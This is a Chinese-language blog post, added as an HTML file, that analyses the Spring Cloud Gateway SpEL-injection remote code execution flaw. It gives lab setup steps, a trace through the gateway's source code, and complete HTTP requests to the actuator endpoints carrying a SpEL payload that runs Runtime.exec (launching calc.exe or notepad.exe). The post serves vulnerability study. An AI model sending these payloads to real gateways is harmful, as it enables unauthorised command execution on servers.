@@ -1,0 +1,443 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【Java反序列化】SpringCloud Gateway RCE分析 | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1663148874314">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【Java反序列化】SpringCloud Gateway RCE分析 | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境搭建
+1、从 https://github.com/spring-cloud/spring-cloud-gateway 下载源码
+2、进入到下载的文件夹中用git check v3.1.0来切换成3.1.0版本。
+3、使用spring-..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1663148874314" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【Java反序列化】SpringCloud Gateway RCE分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-08
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="环境搭建">环境搭建</h2>
+<p>1、从 https://github.com/spring-cloud/spring-cloud-gateway 下载源码<br>
+2、进入到下载的文件夹中用<code>git check v3.1.0</code>来切换成3.1.0版本。<br>
+3、使用<code>spring-cloud-gateway-sample</code>下的<code>GatewaySampleApplication.java</code>来作为调试的demo。但是要成功运行起来还要修改以下几点<br>
+(1)修改<code>spring-cloud-gateway-sample/src/main/resources/application.yml</code>的内容<br>
+<img src="https://limpid94.github.io/post-images/1646750623356.PNG" alt="" loading="lazy"><br>
+<img src="https://limpid94.github.io/post-images/1646750633573.PNG" alt="" loading="lazy"><br>
+将uri这行改成<code>uri: http://example.com:80</code>，以及将PrefixPath这行改成 <code>- PrefixPath=/</code>，将这样启动后访问对应的uri时就会显示一个example页面<br>
+<img src="https://limpid94.github.io/post-images/1646754832244.png" alt="" loading="lazy"><br>
+4、找到<code>org/springframework/cloud/gateway/sample/GatewaySampleApplication.java</code>，将<code>public RouteLocator customRouteLocator(RouteLocatorBuilder builder)</code>上方的@Bean注释并添加一个自己的路由：</p>
+<pre><code class="language-java">	@Bean
+	public RouteLocator myRoutes(RouteLocatorBuilder builder) {
+		String httpUri = &quot;http://httpbin.org:80&quot;;
+		return builder.routes()
+				.route(p -&gt; p
+						.path(&quot;/get&quot;)
+						.filters(f -&gt; f.addRequestHeader(&quot;Hello&quot;, &quot;World!!!&quot;))
+						.uri(httpUri)
+				)
+				.build();
+	}
+</code></pre>
+<h2 id="简单复现">简单复现</h2>
+<p>首先使用如下数据包来添加一条路由</p>
+<pre><code>POST /actuator/gateway/routes/hacktest HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 335
+
+{
+  &quot;id&quot;: &quot;hacktest&quot;,
+  &quot;filters&quot;: [{
+    &quot;name&quot;: &quot;AddResponseHeader&quot;,
+    &quot;args&quot;: {
+      &quot;name&quot;: &quot;Result&quot;,
+      &quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\&quot;calc.exe\&quot;}).getInputStream()))}&quot;
+    }
+  }],
+  &quot;uri&quot;: &quot;http://example.com&quot;
+}
+</code></pre>
+<p><img src="https://limpid94.github.io/post-images/1646797710126.png" alt="" loading="lazy"><br>
+然后刷新路由能触发RCE</p>
+<pre><code>POST /actuator/gateway/refresh HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+</code></pre>
+<p><img src="https://limpid94.github.io/post-images/1646797703551.png" alt="" loading="lazy"><br>
+<img src="https://limpid94.github.io/post-images/1646797697805.png" alt="" loading="lazy"></p>
+<h2 id="原理分析">原理分析</h2>
+<p>根据官方的github上的diff结果，使用<code>GatewayEvaluationContext</code>来代替<code>StandardEvaluationContext</code><br>
+<img src="https://limpid94.github.io/post-images/1646798340898.png" alt="" loading="lazy"><br>
+定位到<code>org/springframework/cloud/gateway/support/ShortcutConfigurable.java</code></p>
+<pre><code class="language-java">	static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue) {
+		Object value;
+		String rawValue = entryValue;
+		if (rawValue != null) {
+			rawValue = rawValue.trim();
+		}
+		if (rawValue != null &amp;&amp; rawValue.startsWith(&quot;#{&quot;) &amp;&amp; entryValue.endsWith(&quot;}&quot;)) {
+			// assume it's spel
+			StandardEvaluationContext context = new StandardEvaluationContext();
+			context.setBeanResolver(new BeanFactoryResolver(beanFactory));
+			Expression expression = parser.parseExpression(entryValue, new TemplateParserContext());
+			value = expression.getValue(context);
+		}
+		else {
+			value = entryValue;
+		}
+		return value;
+	}
+</code></pre>
+<p>查找getValue()的调用处，找到ShortcutType的枚举，并且枚举都重写了normalize()</p>
+<pre><code class="language-java">	enum ShortcutType {
+
+		DEFAULT {
+			@Override
+			public Map&lt;String, Object&gt; normalize(Map&lt;String, String&gt; args, ShortcutConfigurable shortcutConf,
+					SpelExpressionParser parser, BeanFactory beanFactory) {
+				Map&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+				int entryIdx = 0;
+				for (Map.Entry&lt;String, String&gt; entry : args.entrySet()) {
+					String key = normalizeKey(entry.getKey(), entryIdx, shortcutConf, args);
+					Object value = getValue(parser, beanFactory, entry.getValue());
+
+					map.put(key, value);
+					entryIdx++;
+				}
+				return map;
+			}
+		}
+
+</code></pre>
+<p>而shortcutType()调用了ShortcutType枚举的DEFAULT</p>
+<pre><code class="language-java">default ShortcutType shortcutType() {
+		return ShortcutType.DEFAULT;
+	}
+</code></pre>
+<p>接着找到<code>org/springframework/cloud/gateway/support/ConfigurationService.java</code>中的normalizeProperties()调用 shortcutType()。<br>
+而normalizeProperties()又被<code>org/springframework/cloud/gateway/support/ConfigurationService.java</code>的bind()所调用。</p>
+<pre><code class="language-java">		protected abstract T doBind();
+
+		public T bind() {
+			validate();
+			Assert.hasText(this.name, &quot;name may not be empty&quot;);
+			Assert.isTrue(this.properties != null || this.normalizedProperties != null,
+					&quot;properties and normalizedProperties both may not be null&quot;);
+
+			if (this.normalizedProperties == null) {
+				this.normalizedProperties = normalizeProperties();
+			}
+
+			T bound = doBind();
+
+			if (this.eventFunction != null &amp;&amp; this.service.publisher != null) {
+				ApplicationEvent applicationEvent = this.eventFunction.apply(bound, this.normalizedProperties);
+				this.service.publisher.publishEvent(applicationEvent);
+			}
+
+			return bound;
+		}
+</code></pre>
+<p>bind()方法则在<code>org/springframework/cloud/gateway/filter/WeightCalculatorWebFilter.java</code>中的handle方法调用</p>
+<pre><code class="language-java">	public void handle(PredicateArgsEvent event) {
+		Map&lt;String, Object&gt; args = event.getArgs();
+
+		if (args.isEmpty() || !hasRelevantKey(args)) {
+			return;
+		}
+
+		WeightConfig config = new WeightConfig(event.getRouteId());
+
+		this.configurationService.with(config).name(WeightConfig.CONFIG_PREFIX).normalizedProperties(args).bind();
+
+		addWeightConfig(config);
+	}
+</code></pre>
+<p>WeightCalculatorWebFilter与Filter相关。于是参考SpringCloud  API手册：<br>
+<img src="https://limpid94.github.io/post-images/1646845564686.png" alt="" loading="lazy"><br>
+JSON格式就是<br>
+<img src="https://limpid94.github.io/post-images/1646889679695.png" alt="" loading="lazy"><br>
+接下来查找入口<br>
+根据API给出的uri，定位到<code>org/springframework/cloud/gateway/actuate/AbstractGatewayControllerEndpoint.java</code></p>
+<pre><code class="language-java">	@PostMapping(&quot;/routes/{id}&quot;)
+	@SuppressWarnings(&quot;unchecked&quot;)
+	public Mono&lt;ResponseEntity&lt;Object&gt;&gt; save(@PathVariable String id, @RequestBody RouteDefinition route) {
+
+		return Mono.just(route).doOnNext(this::validateRouteDefinition)
+				.flatMap(routeDefinition -&gt; this.routeDefinitionWriter.save(Mono.just(routeDefinition).map(r -&gt; {
+					r.setId(id);
+					log.debug(&quot;Saving route: &quot; + route);
+					return r;
+				})).then(Mono.defer(() -&gt; Mono.just(ResponseEntity.created(URI.create(&quot;/routes/&quot; + id)).build()))))
+				.switchIfEmpty(Mono.defer(() -&gt; Mono.just(ResponseEntity.badRequest().build())));
+	}
+</code></pre>
+<p>先查看RouteDefinition：<br>
+<img src="https://limpid94.github.io/post-images/1646891522030.png" alt="" loading="lazy"><br>
+其中的filters是FilterDefinition类型的列表。再追入FilterDefinition中：<br>
+<img src="https://limpid94.github.io/post-images/1646891612111.png" alt="" loading="lazy"><br>
+从中看到两个参数：name和args。<br>
+之后返回到AbstractGatewayControllerEndpoint的save方法中。该方法内会调用validateRouteDefinition方法来对filter的有效性做了一个校验：</p>
+<pre><code class="language-java">	private void validateRouteDefinition(RouteDefinition routeDefinition) {
+		Set&lt;String&gt; unavailableFilterDefinitions = routeDefinition.getFilters().stream().filter(rd -&gt; !isAvailable(rd))
+				.map(FilterDefinition::getName).collect(Collectors.toSet());
+
+		Set&lt;String&gt; unavailablePredicatesDefinitions = routeDefinition.getPredicates().stream()
+				.filter(rd -&gt; !isAvailable(rd)).map(PredicateDefinition::getName).collect(Collectors.toSet());
+		if (!unavailableFilterDefinitions.isEmpty()) {
+			handleUnavailableDefinition(FilterDefinition.class.getSimpleName(), unavailableFilterDefinitions);
+		}
+		else if (!unavailablePredicatesDefinitions.isEmpty()) {
+			handleUnavailableDefinition(PredicateDefinition.class.getSimpleName(), unavailablePredicatesDefinitions);
+		}
+	}
+···
+而是否有效的关键方法是isAvailable()
+```java
+	private boolean isAvailable(FilterDefinition filterDefinition) {
+		return GatewayFilters.stream()
+				.anyMatch(gatewayFilterFactory -&gt; filterDefinition.getName().equals(gatewayFilterFactory.name()));
+	}
+</code></pre>
+<p>此时用动态调试方法打印出filterDefinition中已经存在的Filter的名字。</p>
+<pre><code>AddRequestHeader
+MapRequestHeader
+AddRequestParameter
+AddResponseHeader
+ModifyRequestBody
+DedupeResponseHeader
+ModifyResponseBody
+CacheRequestBody
+PrefixPath
+PreserveHostHeader
+RedirectTo
+RemoveRequestHeader
+RemoveRequestParameter
+RemoveResponseHeader
+RewritePath
+Retry
+SetPath
+SecureHeaders
+SetRequestHeader
+SetRequestHostHeader
+SetResponseHeader
+RewriteResponseHeader
+RewriteLocationResponseHeader
+SetStatus
+SaveSession
+StripPrefix
+RequestHeaderToRequestUri
+RequestSize
+RequestHeaderSize
+</code></pre>
+<p>此处使用 AddRequestHeader，对应<code>org/springframework/cloud/gateway/route/builder/GatewayFilterSpec.java</code>的addRequestHeader</p>
+<pre><code class="language-java">	/**
+	 * Adds a request header to the request before it is routed by the Gateway.
+	 * @param headerName the header name
+	 * @param headerValue the header value
+	 * @return a {@link GatewayFilterSpec} that can be used to apply additional filters
+	 */
+	public GatewayFilterSpec addRequestHeader(String headerName, String headerValue) {
+		return filter(getBean(AddRequestHeaderGatewayFilterFactory.class)
+				.apply(c -&gt; c.setName(headerName).setValue(headerValue)));
+	}
+</code></pre>
+<p>因此在filters中需要包含name和value两个关键词，而且这里两个参数都是String类型，因此需要将Runtime下的getRuntime的exec方法弄成字节流进行输入，否则会因为类型不匹配报错而终止未完成的流程。</p>
+<h3 id="spel语句构造">SpEL语句构造</h3>
+<p>SpEL语法的T()会返回Object类，可以借助其获取某个类的静态方法<code>T(全限定类名).方法名()</code>。<br>
+例如java上调用Runtime为：</p>
+<pre><code class="language-java">Runtime.getRuntime.exec(&quot;calc.exe&quot;);
+</code></pre>
+<p>用T()操作符可以写成</p>
+<pre><code class="language-java">T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)
+</code></pre>
+<p>结合本文的情况，由于最终是String类型，所以还需要借用<code>org.springframework.util.StreamUtils</code>的<code>copyToByteArray</code>，因此可以写成</p>
+<pre><code class="language-java">#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(Runtime).getRuntime().exec(\&quot;calc.exe\&quot;).getInputStream()))}
+</code></pre>
+<p>##完整数据包：</p>
+<pre><code>{
+  &quot;id&quot;: &quot;hacktest&quot;,
+  &quot;filters&quot;: [{
+    &quot;name&quot;: &quot;AddResponseHeader&quot;,
+    &quot;args&quot;: {
+      &quot;name&quot;: &quot;Result&quot;,
+      &quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\&quot;notepad.exe\&quot;}).getInputStream()))}&quot;
+    }
+  }],
+  &quot;uri&quot;: &quot;http://example.com&quot;
+}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a href="#%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0">简单复现</a></li>
+<li><a href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90">原理分析</a>
+<ul>
+<li><a href="#spel%E8%AF%AD%E5%8F%A5%E6%9E%84%E9%80%A0">SpEL语句构造</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections1-li-yong-lian-lazymap/">
+              <h3 class="post-title">
+                【Java反序列化】CommonCollections1利用链(LazyMap)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
